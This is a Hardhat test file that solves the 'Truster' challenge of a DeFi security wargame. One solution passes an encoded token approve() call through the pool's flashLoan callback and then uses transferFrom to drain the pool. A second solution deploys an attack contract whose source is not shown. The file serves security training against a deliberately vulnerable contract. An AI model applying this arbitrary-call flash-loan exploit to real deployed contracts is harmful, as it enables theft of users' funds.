const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        return;
        console.log("---Mutli-Transactrion Solution (using only client side scripting)---");

        let poolBalance = await token.balanceOf(pool.address);
        let playerBalance = await token.balanceOf(player.address);
        console.log("BEFORE");
        console.log("Pool   balance: ", poolBalance);
        console.log("Player balance: ", playerBalance);
        console.log();

        const data = token.interface.encodeFunctionData("approve(address,uint256)", [player.address, poolBalance]);
        console.log('data: ');
        console.log(data);
        console.log();

        await pool.flashLoan(0n, player.address, token.address, data);
        console.log("Loan completed...");
        console.log();

        let allowBalance = await token.allowance(pool.address, player.address);
        console.log("Player Allowance: ", allowBalance);
        console.log();

        await token.connect(player).transferFrom(pool.address, player.address, poolBalance);
        console.log("Money grab...");
        console.log();

        poolBalance = await token.balanceOf(pool.address);
        playerBalance = await token.balanceOf(player.address);
        console.log("AFTER");
        console.log("Pool   balance: ", poolBalance);
        console.log("Player balance: ", playerBalance);
        console.log();
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        let poolBalance = await token.balanceOf(pool.address);
        let playerBalance = await token.balanceOf(player.address);

        console.log("---Single Transactrion Solution (using a contract to execute attack)---");
        console.log("BEFORE");
        console.log("Pool   balance: ", poolBalance);
        console.log("Player balance: ", playerBalance);
        console.log();

        await (await ethers.getContractFactory('AttackTruster', deployer)).deploy(
            pool.address,
            token.address,
            player.address,
            poolBalance);

        poolBalance = await token.balanceOf(pool.address);
        playerBalance = await token.balanceOf(player.address);
        console.log("AFTER");
        console.log("Pool   balance: ", poolBalance);
        console.log("Player balance: ", playerBalance);
        console.log();
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});
